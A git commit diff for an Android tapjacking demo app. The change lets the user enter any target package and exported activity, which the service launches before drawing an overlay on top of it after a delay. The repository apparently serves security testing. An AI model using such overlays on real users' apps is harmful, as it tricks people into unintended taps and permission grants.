f75bc2570c00f5c1ac75fe5bb8ed4e60e07d6afd
SangCX <sangcx.att99@gmail.com>
2024-09-17 14:10:03 +0700

    add a little flexibility

--- app/src/main/java/com/tapjacking/demo/MainActivity.kt
+++ app/src/main/java/com/tapjacking/demo/MainActivity.kt
@@ -1,24 +1,51 @@
 package com.tapjacking.demo
 import android.content.Intent
-import android.os.Build
 import android.os.Bundle
 import android.provider.Settings
 import androidx.appcompat.app.AppCompatActivity
 import android.net.Uri
+import android.widget.Button
+import android.widget.EditText
+import android.widget.Toast
 
 
 class MainActivity : AppCompatActivity() {
 
     private val OVERLAY_PERMISSION_REQ_CODE = 100
+    private lateinit var intent: Intent
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
         checkOverlayPermission()
+        val start: Button = findViewById(R.id.btn)
+        val stop: Button = findViewById(R.id.stop)
+        val packageName: EditText = findViewById(R.id.package_name)
+        val exportedActivity: EditText = findViewById(R.id.exported_activity)
+        start.setOnClickListener {
+            if (packageName.text.isEmpty() && exportedActivity.text.isEmpty()) {
+                Toast.makeText(this, "Package name and exported activity are required!", Toast.LENGTH_SHORT).show()
+                return@setOnClickListener
+            }
+            intent = Intent(this, OverlayService::class.java)
+            intent.putExtra("targetPackageName", packageName.text.toString())
+            intent.putExtra("targetExportedActivity", exportedActivity.text.toString())
+            startService(intent)
+        }
+
+        stop.setOnClickListener {
+            try {
+                this.stopService(intent)
+            } catch (e: UninitializedPropertyAccessException) {
+                Toast.makeText(this, "Start overlay first :)", Toast.LENGTH_SHORT).show()
+            } catch (e: Exception) {
+                Toast.makeText(this, "???", Toast.LENGTH_SHORT).show()
+            }
+        }
     }
 
     private fun checkOverlayPermission() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
+        if (!Settings.canDrawOverlays(this)) {
             val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName"))
             startActivityForResult(intent, OVERLAY_PERMISSION_REQ_CODE)
         } else {
@@ -29,7 +56,7 @@ class MainActivity : AppCompatActivity() {
     override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
         super.onActivityResult(requestCode, resultCode, data)
         if (requestCode == OVERLAY_PERMISSION_REQ_CODE) {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
+            if (!Settings.canDrawOverlays(this)) {
                 // Handle the case where the user did not grant the permission
             } else {
                 startService(Intent(this, OverlayService::class.java))
--- app/src/main/java/com/tapjacking/demo/OverlayService.kt
+++ app/src/main/java/com/tapjacking/demo/OverlayService.kt
@@ -13,29 +13,43 @@ import android.view.WindowManager
 import android.widget.Button
 import android.os.Build
 import android.util.Log
+import android.widget.Toast
 
 class OverlayService : Service() {
 
     private lateinit var windowManager: WindowManager
     private lateinit var overlayView: View
+    private lateinit var targetPackageName: String
+    private lateinit var targetExportedActivity: String
 
     override fun onBind(intent: Intent?): IBinder? {
         return null
     }
 
-    override fun onCreate() {
-        super.onCreate()
+    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+        if (intent != null) {
+            targetPackageName = intent.getStringExtra("targetPackageName").toString()
+            targetExportedActivity = intent.getStringExtra("targetExportedActivity").toString()
 
-        // 1. Launch the external activity
-        val externalIntent = Intent()
-        externalIntent.setClassName("[PACKAGE NAME]", "[ACTIVITY NAME]")
-        externalIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK) // Required since we're starting the activity from a service
-        startActivity(externalIntent)
+            if (!targetPackageName.equals("null") && !targetExportedActivity.equals("null")) {
+                try {
+                    // 1. Launch the external activity
+                    val externalIntent = Intent()
+                    externalIntent.setClassName(targetPackageName, targetExportedActivity)
+                    externalIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK) // Required since we're starting the activity from a service
+                    startActivity(externalIntent)
 
-        // 2. Delay the presentation of the tapjacking view to give time for the activity to launch
-        Handler().postDelayed({
-            setupTapjackingView()
-        }, 1000) // 1 second delay. Adjust as needed.
+                    // 2. Delay the presentation of the tapjacking view to give time for the activity to launch
+                    Handler().postDelayed({
+                        setupTapjackingView()
+                    }, 1000) // 1 second delay. Adjust as needed.
+                } catch (e: Exception) {
+                    Toast.makeText(this, "Error: Make sure Target package name is correct and activity is exported", Toast.LENGTH_LONG).show()
+                    Log.d("EX", e.toString())
+                }
+            }
+        }
+        return super.onStartCommand(intent, flags, startId)
     }
 
     private fun setupTapjackingView() {
